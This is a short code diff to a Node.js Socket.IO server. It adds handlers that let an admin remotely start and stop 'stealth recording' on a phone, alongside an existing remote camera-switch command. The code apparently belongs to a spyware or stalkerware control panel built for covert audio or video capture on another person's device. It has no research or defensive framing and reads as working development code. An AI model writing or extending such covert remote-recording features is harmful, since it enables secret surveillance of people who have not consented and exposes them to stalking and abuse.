@@ -189,6 +189,18 @@ io.on('connection', (socket) => {
     io.to(`device_${deviceId}`).emit('switch-camera', { camera });
   });
 
+  // Admin remotely triggers stealth recording on phone
+  socket.on('start-remote-recording', ({ deviceId }) => {
+    console.log(`⏺️ Remote recording requested for: ${deviceId}`);
+    io.to(`device_${deviceId}`).emit('start-remote-recording');
+  });
+
+  // Admin remotely stops stealth recording on phone
+  socket.on('stop-remote-recording', ({ deviceId }) => {
+    console.log(`⏹️ Remote recording stop requested for: ${deviceId}`);
+    io.to(`device_${deviceId}`).emit('stop-remote-recording');
+  });
+
   // Disconnect handler
   socket.on('disconnect', async () => {
     const deviceId = socketToDevice.get(socket.id);
